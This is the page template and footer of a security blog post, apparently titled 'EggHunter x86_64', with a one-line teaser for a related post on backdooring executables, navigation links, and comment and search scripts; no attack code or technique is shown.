Summary In this section of my I will be covering the topic of backdooring executables using shellcode and code caves. Code Caves Intro Many people may have never heard about code caves unless you...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/backdooring-portable-executables-(pe)/" class="btn btn-outline-primary" prompt="Older"><p>Backdooring Portable Executables (PE)</p></a> <a href="/posts/infection-monkey-securing-my-network/" class="btn btn-outline-primary" prompt="Newer"><p>Infection Monkey - Securing My Network</p></a></div><div id="disqus" class="pt-2 pb-2"><p class="text-center text-muted small pb-5"> Loading comments from <a href="https://disqus.com/">Disqus</a> ...</p></div><script src="/assets/js/lib/jquery.disqusloader.min.js"></script> <script> const options = { scriptUrl: '//blog-9jgepddjsv.disqus.com/embed.js', disqusConfig: function() { this.page.title = 'EggHunter x86_64'; this.page.url = 'https://ap3x.github.io/posts/egghunter-x86_64/'; this.page.identifier = '/posts/egghunter-x86_64/'; } }; $.disqusLoader('#disqus', options); </script></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('.post-content img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://github.com/Ap3x">Noah Tongate</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/exploit/">exploit</a> <a class="post-tag" href="/tags/osce/">osce</a> <a class="post-tag" href="/tags/development/">development</a> <a class="post-tag" href="/tags/homelab/">homelab</a> <a class="post-tag" href="/tags/how-to/">how to</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/networking/">networking</a> <a class="post-tag" href="/tags/overflow/">overflow</a> <a class="post-tag" href="/tags/pentesting/">pentesting</a> <a class="post-tag" href="/tags/proxmox/">proxmox</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://ap3x.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
